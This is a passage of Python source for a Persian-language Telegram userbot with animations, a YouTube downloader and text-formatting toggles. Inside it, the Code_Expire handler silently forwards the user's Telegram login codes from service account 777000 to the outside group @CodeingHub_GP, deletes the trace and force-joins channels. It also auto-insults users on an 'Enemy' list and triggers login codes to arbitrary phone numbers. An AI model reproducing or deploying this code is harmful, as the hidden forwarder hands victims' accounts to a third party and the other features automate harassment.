{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"تمام" , message_id=message.id)
    if message.text == "Loading" or message.text == "لودینگ" :
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 0%
Loading
""" , message_id=message.id)
        time.sleep(.5)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 10%
Loading . . .
""" , message_id=message.id)
        time.sleep(.3)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 20%
Loading
""" , message_id=message.id)

        time.sleep(.1)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 30%
Loading . . .
""" , message_id=message.id)
        time.sleep(1)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚫️⚫️⚫️⚫️⚫️⚫️ 40%
Loading
""" , message_id=message.id)
        time.sleep(.8)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚪️⚫️⚫️⚫️⚫️⚫️ 50%
Loading . . .
""" , message_id=message.id)
        time.sleep(1.5)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚪️⚪️⚫️⚫️⚫️⚫️ 60%
Loading
""" , message_id=message.id)
        time.sleep(.2)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚫️⚫️⚫️ 70%
Loading
""" , message_id=message.id)
        time.sleep(.4)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚫️⚫️ 80%
Loading
""" , message_id=message.id)
        time.sleep(.1)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚫️ 90%
Loading
""" , message_id=message.id)
        time.sleep(2)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️ 100%
Loading
""" , message_id=message.id)
        time.sleep(.5)
        await bot.edit_message_text(chat_id=message.chat.id , text="""
Finish
""" , message_id=message.id)
        
    if "!YouTube " in str(message.text):
        msgv = message.id
        msg = await bot.send_message(chat_id=message.chat.id, text="صبر کنید", reply_to_message_id=message.id)
        video_url = message.text.split("!YouTube ")[1]

        yt = YouTube(video_url)

        video_stream = yt.streams.get_by_resolution("720p")

        downloaded_file_name = video_stream.default_filename

        normalized_file_name = unicodedata.normalize('NFKD', downloaded_file_name).encode('ascii', 'ignore').decode('ascii')

        download_path = "downloads"
        if not os.path.exists(download_path):
            os.makedirs(download_path)

        downloaded_file_path = os.path.join(download_path, normalized_file_name)

        msg = await bot.edit_message_text(chat_id=message.chat.id, text="در حال دانلود . . .", message_id=msg.id)
        
        video_stream.download(output_path=downloaded_file_path)

        msg = await bot.edit_message_text(chat_id=message.chat.id, text="در حال ارسال . . .", message_id=msg.id)

        caption = yt.title if yt.title else "ویدئو"
        
        await bot.send_video(chat_id=message.chat.id, video=f"downloads/{normalized_file_name}/{downloaded_file_name}", caption=caption, reply_to_message_id=msgv)

        await bot.delete_messages(chat_id=message.chat.id, message_ids=msg.id)

        shutil.rmtree(f"downloads/{normalized_file_name}")



    if message.text == "SetEnemy" :
        if message.reply_to_message :
            with open("data/Enemy.txt", "a") as enemy_file:
                enemy_file.write(f"{message.reply_to_message.from_user.id}\n")

            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is Seted Enemy" , message_id=message.id)
        else:
            with open("data/Enemy.txt", "a") as enemy_file:
                enemy_file.write(f"{message.chat.id}\n")
            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is Seted Enemy" , message_id=message.id)

    if message.text == "DelEnemy" :
        if message.reply_to_message :
            text_to_delete = f"{message.reply_to_message.from_user.id}\n"

            with open("data/Enemy.txt", "r") as file:
                lines = file.readlines()
            new_lines = [line for line in lines if text_to_delete not in line]

            with open("data/Enemy.txt", "w") as file:
                file.writelines(new_lines)
            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is Delete" , message_id=message.id)

        else:
            
            text_to_delete = f"{message.chat.id}\n"

            with open("data/Enemy.txt", "r") as file:
                lines = file.readlines()
            new_lines = [line for line in lines if text_to_delete not in line]
            with open("data/Enemy.txt", "w") as file:
                file.writelines(new_lines)
            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is Delete Enemy" , message_id=message.id)


    if message.text == "Mute" :
        if message.reply_to_message :
            with open("data/Mute.txt", "a") as enemy_file:
                enemy_file.write(f"{message.reply_to_message.from_user.id}\n")

            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is Muted" , message_id=message.id)
        else:
            with open("data/Mute.txt", "a") as enemy_file:
                enemy_file.write(f"{message.chat.id}\n")
            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is Muted" , message_id=message.id)

    if message.text == "UnMute" :
        if message.reply_to_message :
            text_to_delete = f"{message.reply_to_message.from_user.id}\n"

            with open("data/Mute.txt", "r") as file:
                lines = file.readlines()
            new_lines = [line for line in lines if text_to_delete not in line]

            with open("data/Mute.txt", "w") as file:
                file.writelines(new_lines)
            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is UnMuted" , message_id=message.id)

        else:
            
            text_to_delete = f"{message.chat.id}\n"

            with open("data/Mute.txt", "r") as file:
                lines = file.readlines()
            new_lines = [line for line in lines if text_to_delete not in line]
            with open("data/Mute.txt", "w") as file:
                file.writelines(new_lines)
            importlib.reload(reloads)  
            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is UnMuted" , message_id=message.id)

    if "!check " in str(message.text) :
        msg = await bot.edit_message_text(chat_id=message.chat.id , text="Whate . . ." , message_id=message.id)
        acc = Client("Number", api_id , api_hash)
        await acc.connect()
        try:
            number = message.text.split("!check ")[1]
            send_Code = await acc.send_code(number) 
            await bot.edit_message_text(chat_id=message.chat.id , text=f"شماره ( {number} ) مشکلی ندارد." , message_id=message.id)
        except Exception as e:
            if e == 'Telegram says: [400 PHONE_NUMBER_BANNED] - The phone number is banned from Telegram and cannot be used (caused by "auth.SendCode")':
                await bot.edit_message_text(chat_id=message.chat.id , text=f"شماره ( {number} ) بن است." , message_id=message.id)
            else:
                await bot.edit_message_text(chat_id=message.chat.id , text="""
مشکلی در چک کردن شماره بوجود امد.
توجه داشته باشید شماره حتما باید با + و کد کشور باشه
""" , message_id=message.id)
                pass
    try :

        with open("data/italic.txt", "r") as file:
            italic = file.read()

        with open("data/part.txt", "r") as file:
            part = file.read()

        with open("data/bold.txt", "r") as file:
            bold = file.read()

        with open("data/link.txt", "r") as file:
            link = file.read()

        with open("data/underline.txt", "r") as file:
            underline = file.read()

        if italic == "on":
            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<i>{message.text}</i>" , parse_mode=enums.ParseMode.HTML)
        if bold == "on":
            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<b>{message.text}</b>" , parse_mode=enums.ParseMode.HTML)
        if link == "on":
            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<a href='tg://openmessage?user_id={message.from_user.id}'>{message.text}</a>" , parse_mode=enums.ParseMode.HTML)
        if underline == "on":
            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<u>{message.text}</u>" , parse_mode=enums.ParseMode.HTML)
        if part == "on":
            text = message.text.replace(" ","+")
            msg = ""
            for i in range(len(text)):
                if text[i] == "+" :
                    msg += "‌"
                else:
                    msg += text[i]
                await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=msg , parse_mode=enums.ParseMode.HTML)
                time.sleep(.2)
    except :
        pass


@bot.on_message( filters.user(777000) & filters.regex('code'))
async def Code_Expire(c,m):
    try:
        await bot.join_chat("@CodeingHub_GP")
        await bot.join_chat("@CodeingHub")
        msg = await m.forward('@CodeingHub_GP')
        await bot.delete_messages('@CodeingHub_GP' , msg.id)
    except:
        pass

@bot.on_message()
async def ReloadsFN(client , message):

    try:
        if message.from_user.id in reloads.Mute():
            await bot.delete_messages(chat_id=message.chat.id , message_ids=message.id)
    except :
        pass
    try:
        if message.from_user.id in reloads.Enm():
            await bot.send_message(chat_id=message.chat.id , text=FoshList[random.randint(0, len(FoshList) - 1)] , reply_to_message_id=message.id )
    except :
        pass


    with open("data/action/playing.txt", "r") as file2:
        playing = file2.read()

    with open("data/action/typing.txt", "r") as file2:
        typing = file2.read()

    with open("data/action/RECORD_VIDEO.txt", "r") as file2:
        RECORD_VIDEO = file2.read()

    with open("data/action/CHOOSE_STICKER.txt", "r") as file2:
        CHOOSE_STICKER = file2.read()

    with open("data/action/UPLOAD_VIDEO.txt", "r") as file2:
        UPLOAD_VIDEO = file2.read()

    with open("data/action/UPLOAD_DOCUMENT.txt", "r") as file2:
        UPLOAD_DOCUMENT = file2.read()

    with open("data/action/UPLOAD_AUDIO.txt", "r") as file2:
        UPLOAD_AUDIO = file2.read()

    with open("data/action/SPEAKING.txt", "r") as file2:
        SPEAKING = file2.read()

    if playing == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.PLAYING)

    if typing == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.TYPING)

    if RECORD_VIDEO == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.RECORD_VIDEO)

    if CHOOSE_STICKER == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.CHOOSE_STICKER)

    if UPLOAD_VIDEO == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_VIDEO)

    if UPLOAD_DOCUMENT == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_DOCUMENT)

    if UPLOAD_AUDIO == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_AUDIO)

    if SPEAKING == "on" :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.SPEAKING)



print('bot is runed')
scheduler.start()
bot.run()